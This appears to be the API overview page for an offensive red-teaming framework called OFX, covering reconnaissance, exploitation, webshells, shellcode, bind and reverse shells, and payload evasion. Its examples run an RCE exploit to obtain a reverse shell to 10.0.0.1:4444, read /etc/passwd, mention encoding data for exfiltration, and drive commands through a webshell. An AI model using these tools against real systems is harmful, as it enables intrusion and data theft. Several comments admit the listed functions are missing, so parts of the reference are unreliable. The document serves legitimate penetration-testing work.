# API Overview

OFX provides comprehensive red teaming APIs to reduce scripting overhead by 80-90%.

> **Public API:** Use imports under `ofx.api.*`.

## Quick Navigation

- **[Reconnaissance APIs](reconnaissance.md)** - Search engines, OOB testing, network scanning, HTTP server
- **[Exploitation APIs](exploitation.md)** - HTTP client, shellcode generation, webshells, binary exploitation  
- **[Post-Exploitation APIs](post-exploitation.md)** - File operations, utilities, data manipulation, credential helpers
- **[Evasion APIs](evasion.md)** - Payload obfuscation, command evasion

## Categories

> **Note:** Some APIs listed in this overview may not be available in the core library and could be part of other packages within the OFX ecosystem. The examples below use APIs available in the provided source context.

### :material-radar: Reconnaissance

Search engines, port scanning, service grabbing, DNS resolution, and subdomain enumeration.

| API | Purpose | Example |
|-----|---------|---------|
| **Fofa** | Asset discovery via Fofa search | `fofa.search('app="Apache"')` |
| **Shodan** | Internet-wide scanning search | `shodan.search('apache')` |
| **ZoomEye** | Cyberspace search engine | `zoomeye.search('apache')` |
| **CEye** | OOB DNS/HTTP callback testing | `ceye.build_request('data')` |
| **Interactsh** | OOB interaction testing | `interactsh.build_request()` |
| **PHTTPServer** | Payload hosting with SSL | `server.start(daemon=True)` |
<!--
| **PortScanner** | Fast port discovery | `scanner.scan()` |
| **ServiceGrabber** | Banner grabbing | `grabber.grab_banner()` |
| **DNSResolver** | DNS record enumeration | `resolver.query('example.com')` |
| **SubdomainEnumerator** | Subdomain discovery | `enum.enumerate()` |
-->

### :material-bug: Exploitation

Exploit connectors, shellcode generation, webshells, and payload delivery.

| API | Purpose | Example |
|-----|---------|---------|
| **ExploitRunner** | Load and execute exploit connectors | `runner.run_exploit('rce', target, mode)` |
| **ExploitBase** | Base class for exploit development | `class MyExploit(ExploitBase): ...` |
| **ShellcodeGenerator** | Platform-specific shellcode | `gen.generate('linux', 'x64')` |
| **WebShell** | Web shell generation | `shell.generate('php')` |
| **HTTPClient** | Advanced HTTP operations | `client.request(url, method='POST')` |
<!--
| **RemoteTarget** | Socket connections | `with RemoteTarget(host, port) as r:` |
| **BinaryAnalyzer** | Security property analysis | `analyzer.check_pie()` |
| **PayloadBuilder** | Shellcode generation | `builder.build_shellcode()` |
| **ProcessRunner** | Local execution | `runner.execute()` |
-->

### :material-key: Post-Exploitation

File operations, process management, cryptography, and credential handling.

| API | Purpose | Example |
|-----|---------|---------|
| **file** | File operations | `file.read_file(path)` |
| **post** | Post-exploitation helpers | `post.detect_os(uname)` |
| **evasion** | [Evasion helpers](evasion.md) | `evasion.obfuscate_payload(code)` |
| **creds** | Credential helpers | `creds.ExegolHistoryDB()` |
-->

### :material-lan: Network

Network utilities for bind and reverse shells, and shellcode generation.

| API | Purpose | Example |
|-----|---------|---------|
| **bind_shell** | Create bind shell | `network.bind_shell('0.0.0.0', 4444)` |
| **reverse_shell** | Create reverse shell | `network.reverse_shell('10.0.0.1', 8080)` |
| **generate_shellcode_list** | Generate shellcode | `network.generate_shellcode_list('x64', 'linux')` |


## Quick Start

### Reconnaissance Example

```python
from ofx.api.search import FofaClient

# Asset discovery
fofa = FofaClient()
targets = fofa.search('app="Apache" && country="US"', pages=2)

# This example uses fofa, which is available.
# PortScanner is commented out as it is not in the provided context.
# for target_url in list(targets)[:10]:
#     print(target_url)
```

### Exploitation Example

```python
from ofx.api.exploitation.exploit import ExploitRunner, ExploitMode

# Initialize exploit runner
runner = ExploitRunner()

# List available exploits
exploits = runner.list_exploits()
print(f"Available exploits: {exploits}")

# Verify vulnerability
result = runner.run_exploit(
    connector="example_rce",
    target="http://target.com:8080",
    mode=ExploitMode.VERIFY
)

if result.success:
    print("Target is vulnerable!")
    
    # Execute attack
    attack_result = runner.run_exploit(
        connector="example_rce",
        target="http://target.com:8080",
        mode=ExploitMode.ATTACK,
        options={"command": "whoami"}
    )
    
    print(f"Command output: {attack_result.output}")
    
    # Get reverse shell
    shell_result = runner.run_exploit(
        connector="example_rce",
        target="http://target.com:8080",
        mode=ExploitMode.SHELL,
        options={
            "lhost": "10.0.0.1",
            "lport": "4444",
            "shell_type": "bash"
        }
    )
```

### Post-Exploitation Example

```python
from ofx.api.file import read_file

# Read sensitive file
data = read_file('/etc/passwd')

# CryptoUtils is commented out as it is not in the provided context.
# # Hash for verification
# hash_value = CryptoUtils.sha256(data)
# 
# # Encode for exfiltration
# encoded = CryptoUtils.base64_encode(data)
```

## Next Steps

### Detailed API Documentation

Explore comprehensive guides with usage examples:

- **[Reconnaissance APIs](reconnaissance.md)**
  - FOFA, Shodan, ZoomEye search engines
  - CEye, Interactsh OOB testing
  - HTTP server for payload hosting
- **[Exploitation APIs](exploitation.md)**
  - HTTP client with connection pooling
  - Shellcode generation and encoding
  - WebShell factory and client
- **[Post-Exploitation APIs](post-exploitation.md)**
  - File read/write operations
  - String and data utilities
  - URL parsing and IP resolution
  - User agent generation

### CLI Documentation Browser

Use the built-in API documentation command to explore all available APIs:

```bash
# List all API modules
ofx docs api --list

# View detailed documentation for a specific module
ofx docs api --module webshell
ofx docs api --module http
ofx docs api --module file

# View specific function or class details
ofx docs api --module webshell --function WebShell
ofx docs api --module http --function fetch
```

### API Usage in Workflows

All APIs can be used directly in your workflow steps:

```yaml
name: api-example
description: Using OFX APIs in workflows

jobs:
  recon:
    steps:
      - name: Use HTTP API
        script: |
          from ofx.api.http import fetch
          
          response = fetch("https://api.target.com")
          print(response)
      
      - name: Use WebShell API
        script: |
          from ofx.api.exploitation.webshell import WebShellClient
          
          shell = WebShellClient(
              url="{{ inputs.shell_url }}",
              password="{{ inputs.shell_password }}"
          )
          results = shell.batch_run_command(["whoami", "uname -a"])
          for output in results:
              print(output)
```

### Common API Patterns

**HTTP Requests:**
```python
from ofx.api.http import fetch, post

# GET request
response = fetch("https://api.example.com/data")

# POST request
data = post("https://api.example.com/submit", 
            data={"key": "value"})
```

**File Operations:**
```python
from ofx.api.file import read_file, write_file

# Read file
content = read_file("results.txt")

# Write file
write_file("output.txt", "data")
```

**String Manipulation:**
```python
from ofx.api.strings import encode_string, decode_string

# This is an example, function does not exist in provided context
# # Encode/decode
# encoded = encode_string("data")
# decoded = decode_string(encoded)
# 
# # URL operations
# encoded_url = strings.url_encode("param=value&test=1")
```

For complete API reference with parameters, return types, and examples, use:
```bash
ofx docs api --module <module_name>
```
